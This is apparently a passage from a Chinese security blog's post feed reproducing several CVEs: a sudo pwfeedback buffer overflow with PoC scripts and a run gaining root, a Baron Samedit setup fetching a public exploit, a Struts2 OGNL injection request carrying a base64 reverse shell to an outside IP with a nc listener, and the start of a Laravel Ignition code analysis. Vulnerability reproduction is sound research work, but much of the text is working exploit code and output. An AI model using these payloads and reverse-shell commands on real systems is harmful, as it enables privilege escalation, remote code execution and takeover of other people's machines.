class="built_in">read</span>(fd, &amp;c, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (nr != <span class="number">1</span> || c == <span class="string">'\n'</span> || c == <span class="string">'\r'</span>)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> (feedback) &#123;</span><br><span class="line">        <span class="keyword">if</span> (c == sudo_term_kill) &#123;</span><br><span class="line">        <span class="keyword">while</span> (cp &gt; buf) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">write</span>(fd, <span class="string">"\b \b"</span>, <span class="number">3</span>) == <span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            --cp;</span><br><span class="line">        &#125;</span><br><span class="line">        left = bufsiz;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c == sudo_term_erase) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cp &gt; buf) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">write</span>(fd, <span class="string">"\b \b"</span>, <span class="number">3</span>) == <span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            --cp;</span><br><span class="line">            left++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ignore_result(<span class="built_in">write</span>(fd, <span class="string">"*"</span>, <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    *cp++ = c;</span><br><span class="line">    &#125;</span><br><span class="line">    *cp = <span class="string">'\0'</span>;</span><br><span class="line">    <span class="keyword">if</span> (feedback) &#123;</span><br><span class="line">    <span class="comment">/* erase stars */</span></span><br><span class="line">    <span class="keyword">while</span> (cp &gt; buf) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">write</span>(fd, <span class="string">"\b \b"</span>, <span class="number">3</span>) == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        --cp;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    debug_return_str_masked(nr == <span class="number">1</span> ? buf : <span class="literal">NULL</span>);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></div>


<p><code>getln</code> 函数的作用是获取一行的密码输入，用于后序的校验。</p>
<p>从代码可以看出，这里是一个while 循环，每次读取一个字符，在 <code>pwfeedback</code>没有开启的时候，会将字符拷贝到 buf 里</p>
<p>打开<code>pwfeedback</code>后，会有<code>sudo_term_kill</code>和<code>sudo_term_erase</code>两个判断</p>
<p>在<code>lib/util/term.c</code> 中可以找到它们的赋值点, 这里的<code>term.c_cc</code> 是终端的termios 配置，具体参考<a href="https://man7.org/linux/man-pages/man3/termios.3.html" target="_blank" rel="noopener">Linux manual page</a></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (tcsetattr_nobg(fd, TCSASOFT|TCSADRAIN, &amp;term) == <span class="number">0</span>) &#123;</span><br><span class="line">sudo_term_erase = term.c_cc[VERASE];</span><br><span class="line">sudo_term_kill = term.c_cc[VKILL];</span><br><span class="line">changed = <span class="number">1</span>;</span><br><span class="line">debug_return_bool(<span class="literal">true</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>

<p>也可以用stty -a 命令查看当前的终端配置</p>
<p><img src="https://i.loli.net/2021/04/01/7p5DdU8ixbFNa4M.png" alt="img"></p>
<p><code>kill char</code> 和终端的<code>ctrl+U</code>快捷键对应，会删除当前行的所有字符。</p>
<p>对应前面的代码如下：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (c == sudo_term_kill) &#123;</span><br><span class="line">		<span class="keyword">while</span> (cp &gt; buf) &#123;</span><br><span class="line">		    <span class="keyword">if</span> (<span class="built_in">write</span>(fd, <span class="string">"\b \b"</span>, <span class="number">3</span>) == <span class="number">-1</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		    --cp;</span><br><span class="line">		&#125;</span><br><span class="line">      left = bufsiz;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p> <code>cp</code> 是读取过字符的指针，<code>buf</code>是起始地址，b和backspace键对应，<code>&quot;b b&quot;</code> 相当于删除一个字符，于是这个while 循环结束之后，cp 会回到buf的位置，也就是删除了一行。</p>
<p>这里也是漏洞触发点所在。因为<code>poc1</code>并不是在终端获取输入流，而是从管道，这里<code>term.c_cc[VKILL]</code> 会保持初始化的值，也就是<code>x00</code>, 所以传入<code>x00</code>的时候会进入这段代码，但是这个管道是单向管道，往管道写”b b”会失败然后break出while循环，问题也就是出现在这里，跳出while (cp &gt; buf)这个循环之后，cp的位置没有改变，但是可以读取的最大字符数left又变成了bufsize(从代码可找到是256).</p>
<p>所以漏洞的利用原理就是只要不断传入类似<code>&quot;xxx...x00&quot;</code>的字符串，就可以不断向 buf里写东西，造成buf溢出。</p>
<h4 id="poc2分析"><a href="#poc2分析" class="headerlink" title="poc2分析"></a><strong>poc2分析</strong></h4><p>下载编译sudo-1.8.26源码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">wget https://www.sudo.ws/dist/sudo-1.8.26.tar.gz </span><br><span class="line">./configure </span><br><span class="line">make -j16 </span><br><span class="line">make install</span><br></pre></td></tr></table></figure></div>

<p>使用 <code>poc2</code>的原因是在<code>sudo 1.8.26-1.8.30</code> 中加入了对 EOF的处理，于是poc1就不适用了。</p>
<p>同样定位<code>src/tgetpass.c</code>代码部分：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> *</span><br><span class="line">getln(<span class="keyword">int</span> fd, <span class="keyword">char</span> *buf, <span class="keyword">size_t</span> bufsiz, <span class="keyword">int</span> feedback,</span><br><span class="line">    <span class="keyword">enum</span> tgetpass_errval *errval)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  ...</span><br><span class="line">	<span class="keyword">if</span> (feedback) &#123;</span><br><span class="line">	    <span class="keyword">if</span> (c == sudo_term_eof) &#123;     <span class="comment">// &lt;==EOF</span></span><br><span class="line">		nr = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c == sudo_term_kill) &#123;</span><br><span class="line">		<span class="keyword">while</span> (cp &gt; buf) &#123;</span><br><span class="line">		    <span class="keyword">if</span> (<span class="built_in">write</span>(fd, <span class="string">"\b \b"</span>, <span class="number">3</span>) == <span class="number">-1</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		    --cp;</span><br><span class="line">		&#125;</span><br><span class="line">     ...</span><br><span class="line">     ...</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure></div>

<p>但是如果不是通过管道获取输入流，而是从终端获取，也就是pty，情况就不一样了，我们可以在<a href="https://en.wikipedia.org/wiki/ASCII#Control_characters" target="_blank" rel="noopener">维基百科</a>中找到eof和<code>kill</code> 控制符对应的ascii. eof( EOT, ^D End-of-file character) 对应的ascii为0x04, kill为 0x15。 如果从终端获取输入流，那么这个漏洞就又变得可用了。</p>
<p><img src="https://i.loli.net/2021/04/01/JCcGnHfQ87SerBA.png" alt="img"></p>
<p>对应的 poc</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> socat pty,link=/tmp/pty,waitslave <span class="built_in">exec</span>:<span class="string">"python -c 'print(("</span>A<span class="string">"*100+chr(0x15))*50)'"</span> &amp; </span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo -S id &lt; /tmp/pty</span></span><br></pre></td></tr></table></figure></div>

<p>这里创建了一个临时的 pty, 然后还是将 payload 通过 pty 传到 sudo即可</p>
<p>接下来我们就来看看如何对这个漏洞进行利用。</p>
<h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a><strong>调试</strong></h4><p>在分析的时候，查看内存是必不可少的，这里的做法是使用 gdb 结合 pwntools来调试</p>
<p><code>poc2</code>对应的 py 代码如下</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys,os</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">TARGET=os.path.realpath(<span class="string">"/usr/local/bin/sudo"</span>)</span><br><span class="line"></span><br><span class="line">mfd, sfd = os.openpty()</span><br><span class="line">fd = os.open(os.ttyname(sfd), os.O_RDONLY)</span><br><span class="line"></span><br><span class="line">p = process([TARGET,<span class="string">"-S"</span>, <span class="string">"id"</span>],stdin=fd)</span><br><span class="line">pause()</span><br><span class="line">payload = (<span class="string">"A"</span>*<span class="number">100</span>+<span class="string">"x15"</span>)*<span class="number">50</span></span><br><span class="line">os.write(mfd, payload+<span class="string">"n"</span>)</span><br><span class="line">pause()</span><br><span class="line">sys.exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></div>

<p>运行上面这段代码，等 pause()执行再用 gdb attach pid即可</p>
<p>这里需要注意sudo运行时是<code>root</code>权限，所以gdb也需要用root权限运行，切换root用户或使用<code>chmod 777 /usr/bin/gdb</code></p>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">as1def@As1def:~/sudo-CVE-2019-18634$ cat a.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">id &gt; end</span><br><span class="line">as1def@As1def:~/sudo-CVE-2019-18634$ python -c "from pwn import *;print 'x00x15'*548+p64(6)+'x00x15'*20+p64(0)*2+p32(0)+'x00'*3+'n'" &gt; poc</span><br><span class="line">as1def@As1def:~/sudo-CVE-2019-18634$ socat pty,link=/tmp/pty,waitslave exec:"cat /home/as1def/sudo-cve-2019-18634/poc" &amp;</span><br><span class="line">[1] 2380</span><br><span class="line">as1def@As1def:~/sudo-CVE-2019-18634$ SUDO_ASKPASS=/home/as1def/sudo-cve-2019-18634/aa.sh sudo -S id &lt; /tmp/pty</span><br><span class="line">密码：</span><br><span class="line">对不起，请重试。</span><br><span class="line">sudo: 1 次错误密码尝试</span><br><span class="line">as1def@As1def:~/sudo-CVE-2019-18634$ cat end</span><br><span class="line">uid=0(root) gid=1000(as1def) 组=1000(as1def),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)</span><br><span class="line">[1]+  已完成               socat pty,link=/tmp/pty,waitslave exec:"cat /home/as1def/sudo-cve-2019-18634/poc"</span><br><span class="line">as1def@As1def:~/sudo-CVE-2019-18634$ ls</span><br><span class="line">a.sh  end  poc  sudo  sudo-1.8.25  sudo-1.8.25.tar.gz  sudo-1.8.26  sudo-1.8.26.tar.gz</span><br></pre></td></tr></table></figure></div>

<h4 id="（EXP）"><a href="#（EXP）" class="headerlink" title="（EXP）"></a><strong>（EXP）</strong></h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/saleemrashid/sudo-cve-2019-18634/master/exploit.c</span><br></pre></td></tr></table></figure></div>

<p>把exploit.c编译后传到目标机器上</p>
<p>运行exploit提权成功</p>
<h4 id="结语"><a href="#结语" class="headerlink" title="结语"></a><strong>结语</strong></h4><p>CVE-2019-18634 是一个 bss变量溢出漏洞，只有在开启 pwfeedback机制的时候才可能触发，最终利用可以使用root权限执行任意程序。</p>
]]></content>
      <tags>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2021-3156 提权漏洞复现</title>
    <url>/2021/03/01/CVE-2021-3156-%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h3 id="CVE-2021-3156-提权漏洞"><a href="#CVE-2021-3156-提权漏洞" class="headerlink" title="CVE-2021-3156 提权漏洞"></a>CVE-2021-3156 提权漏洞</h3><p><img src="/images/CVE-2021/title.png" alt="title"></p>
<a id="more"></a>

<h4 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h4><p>Sudo是一个功能强大的工具，其允许普通用户执行root权限命令，大多数基于Unix和Linux的操作系统都包含sudo。</p>
<p>2021年01月26日，sudo被披露存在一个基于堆的缓冲区溢出漏洞（CVE-2021-3156，该漏洞被命名为“Baron Samedit”），可导致本地权限提升。</p>
<p>当在类Unix的操作系统上执行命令时，非root用户可以使用sudo命令来以root用户身份执行命令。由于sudo错误地在参数中转义了反斜杠导致堆缓冲区溢出，从而允许任何本地用户（无论是否在sudoers文件中）获得root权限，无需进行身份验证，且攻击者不需要知道用户密码。</p>
<h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line">Sudo <span class="number">1.8</span><span class="number">.2</span> - <span class="number">1.8</span><span class="number">.31</span>p2</span><br><span class="line">Sudo <span class="number">1.9</span><span class="number">.0</span> - <span class="number">1.9</span><span class="number">.5</span>p1</span><br><span class="line"></span><br><span class="line">#ECS受影响的镜像版本</span><br><span class="line">Alibaba Cloud Linux <span class="number">2</span></span><br><span class="line">CentOS <span class="number">6</span>/<span class="number">7</span>/<span class="number">8</span></span><br><span class="line">Red Hat Enterprise Linux <span class="number">6</span>/<span class="number">7</span>/<span class="number">8</span></span><br><span class="line">Ubuntu <span class="number">14</span>/<span class="number">16</span>/<span class="number">18</span>/<span class="number">20</span></span><br><span class="line">Debian <span class="number">8</span>/<span class="number">9</span>/<span class="number">10</span></span><br><span class="line">SUSE Linux Enterprise Server <span class="number">12</span>/<span class="number">15</span></span><br><span class="line">OpenSUSE <span class="number">42.3</span>/<span class="number">15</span></span><br><span class="line">FreeBSD <span class="number">11</span>/<span class="number">12</span></span><br></pre></td></tr></table></figure></div>

<p>测试系统是否易受此漏洞影响：</p>
<ul>
<li>以非root用户身份登录系统。</li>
<li>运行命令“sudoedit -s /”</li>
<li>如果出现以“ sudoedit：”开头的错误响应，则系统受到此漏洞影响；如果出现以“ usage：”开头的错误响应，则表示该漏洞已被补丁修复。</li>
</ul>
<h4 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">wget https://haxx.in/CVE-2021-3156_nss_poc_ubuntu.tar.gz</span><br><span class="line">tar -zxvf CVE-2021-3156_nss_poc_ubuntu.tar.gz</span><br><span class="line"><span class="built_in">cd</span> CVE-2021-3156</span><br><span class="line">make</span><br></pre></td></tr></table></figure></div>

<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>执行./sudo-hax-me-a-sandwich 列出可选择目标，这里选Debain</p>
<p><img src="/images/CVE-2021/res.png" alt="res"></p>
]]></content>
      <tags>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2020-17530 Struts远程代码执行</title>
    <url>/2020/12/28/CVE-2020-17530-Struts%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<p><img src="https://i.loli.net/2021/04/02/OPgoCcQp8ebkN5q.png" alt="image-20210402220435850"></p>
<a id="more"></a>

<h3 id="CVE-2020-17530：Struts2远程代码执行漏洞"><a href="#CVE-2020-17530：Struts2远程代码执行漏洞" class="headerlink" title="CVE-2020-17530：Struts2远程代码执行漏洞"></a>CVE-2020-17530：Struts2远程代码执行漏洞</h3><h4 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h4><p>2020年12月08日，360CERT监测发现 <code>struts2</code> 发布了 <code>struts2 代码执行漏洞</code> 的风险通告，该漏洞编号为 <code>CVE-2020-17530</code> ，漏洞等级：<code>高危</code> ，漏洞评分：<code>7.5</code> 。</p>
<p>在特定的环境下，远程攻击者通过构造 <code>恶意的OGNL表达式</code> ,可造成 <code>任意代码执行</code> 。</p>
<h4 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h4><p>Struts 2.0.0 – Struts 2.5.25</p>
<h4 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03 环境搭建"></a>0x03 环境搭建</h4><p>docker-compose.yml</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="YML"><figure class="iseeu highlight /yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">'2'</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"> <span class="attr">struts2:</span></span><br><span class="line">   <span class="attr">image:</span> <span class="string">vulhub/struts2:2.5.25</span></span><br><span class="line">   <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">"8080:8080"</span></span><br></pre></td></tr></table></figure></div>

<p>1、启动strusts 2.5.25环境</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></div>

<p>2、容器启动后，访问首页：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DTS"><figure class="iseeu highlight /dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//your_ip:8080/index.action</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/04/02/aMfJzOwtpWD435m.png" alt="image-20210402140658938"></p>
<h4 id="0x04-漏洞详情"><a href="#0x04-漏洞详情" class="headerlink" title="0x04 漏洞详情"></a>0x04 漏洞详情</h4><p>Struts在某些情况下可能存在OGNL表达式注入漏洞，如果开发人员使用了 %{…} 语法进行强制OGNL解析，某些特殊的TAG属性可能会被双重解析。攻击者可以通过构造恶意的OGNL表达式来利用此漏洞，最终造成远程代码执行。</p>
<h4 id="0x05-漏洞复现"><a href="#0x05-漏洞复现" class="headerlink" title="0x05 漏洞复现"></a>0x05 漏洞复现</h4><p>以POST方式发送如下数据包，而后进行反弹shell</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.action</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 116.62.180.141:8080</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data;boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF </span><br><span class="line"><span class="attribute">Content-Length</span>: 921</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryl7d1B1aGsV2wcZwF</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="id" </span><br><span class="line"></span><br><span class="line">%&#123;(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("bash-c&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTYuNjIuMTgwLjE0MS81MDA1IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))&#125;</span><br><span class="line">------WebKitFormBoundaryl7d1B1aGsV2wcZwF--</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/04/02/TwcJMedijk2H1y6.png" alt="image-20210402210826102"></p>
<p>2、反弹shell部分</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CLEAN"><figure class="iseeu highlight /clean"><table><tr><td class="code"><pre><span class="line">(#arglist.add(<span class="string">"bash -c&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC95b3VyX2lwL3BvcnQgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;"</span>)).(#execute=#instancemanager.newInstance(<span class="string">"freemarker.template.utility.Execute"</span>))</span><br></pre></td></tr></table></figure></div>

<p>base64部分为linux执行反弹shell的命令：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/your_ip<span class="built_in">/port </span>0&gt;&amp;1</span><br></pre></td></tr></table></figure></div>

<p>3、攻击机端口监听</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="EBNF"><figure class="iseeu highlight /ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc -lvvp port</span></span><br></pre></td></tr></table></figure></div>

<p>发送数据包，反弹shell</p>
<h4 id="0x06-防御措施"><a href="#0x06-防御措施" class="headerlink" title="0x06 防御措施"></a>0x06 防御措施</h4><p>Struts 2.5.25以上版本不存在该漏洞，建议升级Struts 2版本。</p>
]]></content>
      <tags>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2021-3129 Laravel远程代码执行漏洞</title>
    <url>/2021/04/11/CVE-2021-3129-Laravel%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p><img src="https://i.loli.net/2021/04/11/UtxnvrzVN8eTOJC.png" alt="img"></p>
<a id="more"></a>

<h3 id="CVE-2021-3129-Laravel远程代码执行漏洞"><a href="#CVE-2021-3129-Laravel远程代码执行漏洞" class="headerlink" title="CVE-2021-3129 Laravel远程代码执行漏洞"></a><strong>CVE-2021-3129 Laravel远程代码执行漏洞</strong></h3><h4 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a><strong>漏洞详情</strong></h4><p>Laravel是一套简洁、开源的PHP Web开发框架，旨在实现Web软件的MVC架构。</p>
<p>当Laravel开启了Debug模式时，由于Laravel自带的Ignition 组件对file_get_contents()和file_put_contents()函数的不安全使用，攻击者可以通过发起恶意请求，构造恶意Log文件等方式触发Phar反序列化，最终造成远程代码执行。</p>
<h4 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a><strong>影响范围</strong></h4><p>Laravel &lt;= 8.4.2</p>
<p>Ignition &lt;2.5.2</p>
<h4 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a><strong>漏洞环境</strong></h4><p>使用GitHub上已有现成的docker环境搭建</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SUBUNIT"><figure class="iseeu highlight /subunit"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/SNCKER/CVE<span class="string">-2021</span><span class="string">-3129</span> </span><br><span class="line">cd CVE<span class="string">-2021</span><span class="string">-3129</span>/ </span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></div>

<p>访问<a href="http://192.168.130.128:8888" target="_blank" rel="noopener">http://192.168.130.128:8888</a></p>
<p>出现此页面说明环境搭建完成。</p>
<p><img src="https://i.loli.net/2021/04/11/OayBWjp1oFPc2zX.png" alt="img"></p>
<p>同时我们需要下载漏洞利用所需的<code>phpggc</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRMSH"><figure class="iseeu highlight /crmsh"><table><tr><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/ambionics/phpggc.git </span><br><span class="line">chmod <span class="number">777</span> phpggc/</span><br></pre></td></tr></table></figure></div>

<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a><strong>漏洞复现</strong></h4><p>以 <a href="https://github.com/facade/ignition/releases/tag/2.5.1" target="_blank" rel="noopener">Ignition 2.5.1</a> 源代码审计。漏洞其实就发生在Ignition（&lt;=2.5.1）中</p>
<p>在功能解析的文章中，我们知道 Igniton 有很多建议的解决方案，这对应着源码中的 <code>Solutions</code>：</p>
<p><img src="https://i.loli.net/2021/04/11/v8sPDZt5QhuSmoB.png" alt="img"></p>
<p>在我们配置环境过程中出现的<code>generate app key</code> 也源自于它。点击按钮后会发送一个请求，也就是通过这个请求Ignition成功在配置文件中生成了一个key。</p>
<p><img src="https://i.loli.net/2021/04/11/BsgwZNLq1lDPRdv.png" alt="img"></p>
<p>通过这些solutions，开发者可以通过点击按钮的方式，快速修复一些错误。</p>
<p>本次漏洞就是其中的<code>vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php</code>过滤不严谨导致的。</p>
<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a><strong>漏洞分析</strong></h4><p>首先我们到执行solution的控制器当中去，看看是如何调用到solution的</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAGGERSCRIPT"><figure class="iseeu highlight /taggerscript"><table><tr><td class="code"><pre><span class="line"><span class="symbol">\s</span>rc<span class="symbol">\H</span>ttp<span class="symbol">\C</span>ontrollers<span class="symbol">\E</span>xecuteSolutionController.php</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Facade</span>\<span class="title">Ignition</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Facade</span>\<span class="title">Ignition</span>\<span class="title">Http</span>\<span class="title">Requests</span>\<span class="title">ExecuteSolutionRequest</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Facade</span>\<span class="title">IgnitionContracts</span>\<span class="title">SolutionProviderRepository</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Validation</span>\<span class="title">ValidatesRequests</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ExecuteSolutionController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">ValidatesRequests</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        ExecuteSolutionRequest $request,</span></span></span><br><span class="line"><span class="function"><span class="params">        SolutionProviderRepository $solutionProviderRepository</span></span></span><br><span class="line"><span class="function"><span class="params">    )</span> </span>&#123;</span><br><span class="line">        $solution = $request-&gt;getRunnableSolution();</span><br><span class="line">    </span><br><span class="line">        $solution-&gt;run($request-&gt;get(<span class="string">'parameters'</span>, []));  <span class="comment">/***/</span></span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> response(<span class="string">''</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

